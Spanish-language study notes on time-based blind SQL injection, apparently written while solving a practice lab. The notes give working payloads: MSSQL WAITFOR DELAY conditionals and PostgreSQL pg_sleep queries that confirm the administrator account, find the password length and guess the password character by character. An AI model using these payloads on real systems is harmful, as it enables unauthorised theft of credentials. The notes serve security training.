
Si la aplicación detecta errores de la base de datos cuando se ejecuta la consulta SQL y los maneja correctamente, no habrá ninguna diferencia en la respuesta de la aplicación. Esto significa que la técnica anterior para inducir errores condicionales no funcionará.

En esta situación, a menudo es posible explotar la vulnerabilidad de la inyección SQL ciega activando retrasos dependiendo de si una condición inyectada es verdadera o falsa. Como las consultas SQL normalmente las procesa la aplicación de forma sincrónica, retrasar la ejecución de una consulta SQL también retrasa la respuesta HTTP. Esto le permite determinar la verdad de la condición inyectada en función del tiempo necesario para recibir la respuesta HTTP.

## Explotación de la inyección SQL ciega provocando retrasos de tiempo - Continuación

Las técnicas para activar un retraso de tiempo son específicas del tipo de base de datos que se utiliza. Por ejemplo, en Microsoft SQL Server, puede utilizar lo siguiente para probar una condición y desencadenar un retraso dependiendo de si la expresión es verdadera:

```
; IF (1=2) WAITFOR DELAY '0:0:10'-- 
';IF (1=1) WAITFOR DELAY '0:0:10'--
```

- La primera de estas entradas no desencadena un retraso porque la condición `1=2`es falsa.
- La segunda entrada desencadena un retraso de 10 segundos, porque la condición `1=1`es verdadera.

Usando esta técnica, podemos recuperar datos probando un carácter a la vez:

`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

## Caso 25: Inyección SQL ciega con retardos de tiempo y recuperación de información

Los resultados de la consulta SQL no se devuelven y la aplicación no responde de manera diferente en función de si la consulta devuelve alguna fila o provoca un error. Sin embargo, dado que la consulta se ejecuta de forma sincrónica, es posible activar retrasos de tiempo condicionales para inferir información.

La base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username`y `password`. Debe aprovechar la vulnerabilidad de inyección ciega de SQL para descubrir la contraseña del `administrator`usuario.

Para resolver la práctica de laboratorio, inicie sesión como `administrator`usuario.



';select case when (1=1) then pg_sleep(5) else pg_sleep(1) end--

![[Pasted image 20240612155651.png]]
![[Pasted image 20240612155711.png]]


';select case when (username='administrator') then pg_sleep(5) else pg_sleep(1) end from users--

![[Pasted image 20240612155822.png]]
![[Pasted image 20240612155920.png]]

';select case when (username='administrator'and length(password)>=20) then pg_sleep(5) else pg_sleep(1) end from users--

![[Pasted image 20240612160103.png]]
![[Pasted image 20240612160123.png]]

';select case when (username='administrator'and substring(password,20,1)='§a§') then pg_sleep(5) else pg_sleep(1) end from users--

![[Pasted image 20240612160241.png]]
![[Pasted image 20240612153818.png]]
![[Pasted image 20240612154015.png]]
